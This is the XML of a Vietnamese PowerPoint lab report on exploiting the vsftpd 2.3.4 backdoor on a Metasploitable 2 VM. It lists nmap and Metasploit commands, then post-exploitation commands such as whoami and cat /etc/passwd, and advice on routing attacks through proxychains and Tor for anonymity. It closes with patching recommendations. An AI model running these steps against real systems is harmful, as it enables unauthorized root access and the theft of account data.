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C8B1-3220-4D27-AC49-9C0A31FEC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8DEA5-4E3E-47D8-83A0-C10BD6162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AE01C-EE83-44C1-A86C-FF222998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9C14-DE22-4687-8E16-2C6BDFD5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CAE5C-6DF1-4905-861E-971940FC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2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C5F6-D9EF-436F-B89D-389DBF51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74A2-3C1B-467A-A092-252C96640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A0CDC-9567-4105-963C-039BABE2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FB36-0525-49E8-B40B-E219D8AF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A643-A334-470B-A051-4D2666E6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A8EB-6B16-4603-95C8-DC9D0EB1A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CBDF2-4DE4-46A4-AABF-505AFFF52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9A935-1707-473B-85A9-01A79380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B9220-91FB-4D44-A4A5-B1C7116A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A0152-2BE7-4450-8FC7-4BA5B32D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F0F7-661F-4A8B-9F1D-9CE85179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C628-D692-43A9-87B7-0443C0A91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031EB-2666-43F5-8384-7A4345893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93FCD-5DEE-4ED3-BA0E-AC899985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A8355-2A9E-4646-A71E-70B4D6A3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0A4E5-C395-4022-86FC-8FACE68D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6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FC50-7C2B-4A1E-8548-15118A99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71F0-749E-4AE7-98BB-B39E12941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AB42D-9FD3-4487-A52A-367DB831B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A6EF5-8502-452F-8610-125BF2714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26828-CE33-4EA2-9AEE-0C958B8E3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B532E-5DC0-4896-B07A-83BD627F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85413-D9FB-4AB3-ACA4-BA672FAC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42A0E-04F6-4DA2-9A12-68C260F6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3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544E-4C17-48DA-A538-6D857C9E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1A553-2779-4505-BBE5-319AC6F8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0AA14-2DAC-4365-BF8A-11A7D3E6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0398E-707E-41EE-B94A-F25B645A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4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28F32-C890-4ABA-8E76-022EA505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D7F15-86B0-453A-A3CD-A8C2339B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119B7-C0F6-4BED-AA27-0BD9A003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71B3-C5C3-479E-9700-3EDFDD48B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CBCB-A2AA-41DA-93C5-C56B83FBF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F3EF-59F6-4571-9213-D227864E3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E39A0-2E89-4E8A-AB62-F1A0B92E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192A-4118-4907-AB85-2126E0FF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8F0B0-9C09-447E-8B96-A731FC51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8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7D07-C930-4F08-AEA2-573948C3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8E7C8-CC8A-446D-BBE2-2B955215D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1F8EB-B9BA-4E0A-BDF2-A93CB545A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1307B-F697-4351-A34D-2165D32E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E7E5C-C7C5-4DB6-991F-751E40E0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1BFDB-4FE9-41E1-A361-E28A8BD6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9AAC-A32F-437E-9965-E9AB3C0D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9BCD7-A687-41DC-8EB2-9EA9CB179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CA93F-B2C9-4BB0-BB38-5215A1327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92A5-314E-4116-88BC-E29941814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8C40-25D7-443A-9FB7-6D7BF447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72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5ADA6-B641-4E64-BC33-34CD48139A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201A6-3D2B-4B27-8F45-8597D046F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315B2-5087-4161-81F7-FD3C6CCB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7350-5FC6-4B89-8F1A-4B4A0E0A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FEA53-3138-4E32-8BAE-7819E6EA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196A1-BBB9-4884-A43D-3B009C05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61A55-A1F9-464F-80E1-B565F8119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2288E-6DA5-4AE5-83C5-4CF3EC6DF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CE39E-1F07-4C0B-B5E4-C95BF1451B1D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1254B-CDB5-4284-B17D-CAE86C83A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3B760-AB3D-4AC5-98C9-8EE4A353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E7411-826B-45CF-97AA-C6E3CC1D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7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6FA5-EE6E-461C-852E-BFB156A93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2337"/>
            <a:ext cx="9144000" cy="151424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vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2.3.4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14385-CCEB-4169-8ABC-4FA3878C4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40863"/>
            <a:ext cx="9144000" cy="4114799"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l"/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: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kali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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ip </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>máy</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: 192.168.1.8</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ip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metasploiable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2: 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Setup networking: bridge adapter</a:t>
            </a:r>
          </a:p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 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Metasploit, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proxychains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53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DDA2E-0D15-4625-BB67-B7A96553D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MỤC TIÊU:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-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FTP backdoor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vsftpd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> 2.3.4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>-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proxychains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7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13B0-915A-47BC-A72B-A8FB106A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2232"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Ping </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> kali </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>linux</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>metasploiable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B0D0-2733-4354-9E21-9AB307B40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269"/>
            <a:ext cx="10515600" cy="5427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Ping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3 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lần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Ping –c 3 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Quét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IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Metasploitable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netdiscover</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –r 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Quét</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> port </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>với</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Nmap and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proxychains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nmap</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –O 192.168.1.129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proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r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sT</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Pn</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> -n –p 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone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search: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>	search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vsftpd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935C5-35B8-4362-B0A6-64EA94A38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86" y="131675"/>
            <a:ext cx="2312361" cy="13935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B7D640-4781-4F00-B29C-8C3E9AD09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753" y="1696491"/>
            <a:ext cx="2209186" cy="1331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E06743-ED94-40F4-88F0-077BE312F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38" y="3178142"/>
            <a:ext cx="2730031" cy="1645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70556B-95BC-4EF6-AC5F-B9267FDA7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153" y="4819918"/>
            <a:ext cx="3302516" cy="184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8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DA72-2E28-4838-877D-46312F7D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Metasploit and </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proxychains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7269-D69C-483D-807C-AB26141B0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790"/>
            <a:ext cx="10515600" cy="488217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msfconsole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ProxyChains</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p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Search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/ftp/vsftpd_234_backdoor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rhost</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set RHOST 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rport</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set RPORT 21</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>run 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BF4F3-4B22-4F19-8DA7-5AC2FEF55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415" y="994870"/>
            <a:ext cx="2556535" cy="1309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C8F6CB-8DF6-4D30-82C1-0A4967C12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569" y="1762964"/>
            <a:ext cx="2597619" cy="1565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CE13D5-E32F-4F33-97BC-DC7E04DE9F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111" y="2614568"/>
            <a:ext cx="2702839" cy="1628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8742A0-BDC5-4044-8A7A-BFEBA0DFC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328" y="3715094"/>
            <a:ext cx="2414213" cy="1454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BB2E1C-50CA-4B97-B8D8-2B3CC5B577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171" y="4548100"/>
            <a:ext cx="2702839" cy="16288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4150D2-EA43-4FC8-A743-AE14B71496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316" y="5485676"/>
            <a:ext cx="2294160" cy="138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5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EE4E-1923-4FAB-AE2D-2EB5E32A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094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959BD-08C7-4C25-90BB-60EDB756F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573"/>
            <a:ext cx="10515600" cy="4794390"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p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network = bridge adapter </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>gây</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ra </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>lỗi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> (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shell,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backdoor)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proxychains</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>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do </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proxychains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lan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.</a:t>
            </a:r>
          </a:p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dung </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>proxychains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sang host-only adapter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 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Next Step: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>bây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msfconsole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336D4-F369-4FBD-9F0E-ADE7E96D2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26" y="4392777"/>
            <a:ext cx="3778173" cy="227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8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BB25-DB09-45AC-86D6-CAAFA667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361"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p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proxychains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9658A-2C97-448B-8E52-6FA3A1A51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627"/>
            <a:ext cx="10515600" cy="481633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msfconsole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Msfconsole</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>search </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>vsftpd</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>use exploit/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>unix</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/ftp/vsftpd_234_backdoor </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rhost</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set RHOST 192.168.1.129</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Rport</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>set RPORT 21</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>run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860E6-5AFA-4847-8705-A791BFD5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050" y="91121"/>
            <a:ext cx="2209191" cy="1331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2A2EA-EAC2-47C1-860C-8644DF129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404" y="1097280"/>
            <a:ext cx="2209191" cy="1331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293C0-09C3-4B93-956E-A29AB4834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567" y="1801006"/>
            <a:ext cx="3265232" cy="1967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CFC3C3-979C-4734-9942-DFBDA06D1A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338" y="3768795"/>
            <a:ext cx="2257744" cy="13606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014987-8186-4E86-A8B6-7DB5B21372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371" y="4209174"/>
            <a:ext cx="2827197" cy="17038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B7BE19-0619-4410-BA16-40A724EBA8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307" y="5383434"/>
            <a:ext cx="2446807" cy="147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11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E5745-9610-404C-BEAB-2F662434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dirty="0"/>
              <a:t>PHÂN TÍCH TẤN CÔNG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CB485-C990-4AEC-82AB-9448792C7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682"/>
            <a:ext cx="10515600" cy="4838281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endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>Whoami</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>uname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> –a</a:t>
            </a:r>
          </a:p>
          <a:p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  <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>cat /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/passwd</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>netstat -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>tulnp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F9A3F-9392-4096-8A3F-0FB4FEB76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220" y="204826"/>
            <a:ext cx="2658312" cy="1602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FF3B9-D4EC-47E0-AE4F-687B3AA3D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422" y="2185053"/>
            <a:ext cx="2998188" cy="1806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DEB84-F290-4D03-ABC5-56BD4C27C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785" y="4355476"/>
            <a:ext cx="3625747" cy="218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8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B426-053D-4E83-BC5B-56D35113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848E-1417-41CE-B3D9-677C63994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670"/>
            <a:ext cx="10515600" cy="4699293"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="25000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>### Phân tích sự cố khi sử dụng ProxyChains trong mạng nội bộ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Trong quá trình thực hiện khai thác lỗ hổng vsftpd 2.3.4 bằng Metasploit, tôi đã thử sử dụng ProxyChains để định tuyến lưu lượng qua mạng Tor nhằm ẩn danh.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Cấu hình:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Mạng sử dụng: Bridge Adapter (IP LAN: 192.168.1.100 – 192.168.1.101)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Proxy: Tor SOCKS5 tại 127.0.0.1:9050</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Công cụ: proxychains + msfconsole</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Kết quả:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Cuộc tấn công được gửi đi và báo "shell opened"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Tuy nhiên, không có phiên (session) được tạo và shell không phản hồi</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Nguyên nhân phân tích:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- ProxyChains + Tor không hỗ trợ định tuyến IP nội bộ (LAN)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Shell tương tác yêu cầu kết nối 2 chiều, nhưng Tor không hỗ trợ điều này trong mạng nội bộ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Reverse shell không thể kết nối lại vì gói tin bị định tuyến sai</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>Giải pháp:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Không sử dụng proxychains trong tấn công LAN</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Dùng Metasploit trực tiếp với RHOST là IP thật của Metasploitable</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Chỉ sử dụng proxychains khi tấn công mục tiêu công cộng (Internet)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2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CA09-4359-43E9-8E95-51D5905D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869"/>
            <a:ext cx="10515600" cy="5855094"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="25000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>MỤC TIÊU: 192.168.1.101 - Metasploitable 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>LỖ HỔNG KHAI THÁC: vsftpd 2.3.4 backdoor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>CÔNG CỤ: Metasploit Framework, Proxychains, TOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>QUÁ TRÌNH:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Quét port phát hiện port 21 mở</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Dùng `exploit/unix/ftp/vsftpd_234_backdoor` trong Metasploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Thiết lập RHOST, RPORT, và chạy exploit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Nhận được shell command</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>PHÂN TÍCH:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- `whoami` → root</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- `cat /etc/passwd` → Thu thập danh sách người dùng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- `netstat` → Xác định thêm các dịch vụ chạy</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Có thể sửa đổi file hệ thống, cài backdoor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Có thể trích xuất file mật khẩu MySQL nếu có</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>ĐÁNH GIÁ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Lỗ hổng nghiêm trọng, cho phép chiếm toàn quyền</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Dễ bị thực hiện bởi hacker trình độ trung bình</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="vi-VN" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>KHUYẾN NGHỊ:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Ngưng sử dụng vsftpd 2.3.4</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Cập nhật FTP server lên bản mới nhất</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="vi-VN" dirty="0"/>
              <a:t>- Sử dụng firewall để hạn chế truy cập port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2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751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Báo cáo thực hành tấn công vsftpd 2.3.4</vt:lpstr>
      <vt:lpstr>PowerPoint Presentation</vt:lpstr>
      <vt:lpstr>Ping ip kali linux -&gt; metasploiable</vt:lpstr>
      <vt:lpstr>Khai thác lỗ hổng với Metasploit and proxychains</vt:lpstr>
      <vt:lpstr>Vấn đề thường gặp:</vt:lpstr>
      <vt:lpstr>Tấn công không sử dụng proxychains.</vt:lpstr>
      <vt:lpstr>PHÂN TÍCH TẤN CÔNG</vt:lpstr>
      <vt:lpstr>Kết luận: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thực hành tấn công vsftpd 2.3.4</dc:title>
  <dc:creator>trung nguyen</dc:creator>
  <cp:lastModifiedBy>trung nguyen</cp:lastModifiedBy>
  <cp:revision>32</cp:revision>
  <dcterms:created xsi:type="dcterms:W3CDTF">2025-07-20T01:12:42Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2025-07-20T06:30:49Z</dcterms:modified>
</cp:coreProperties>
</file>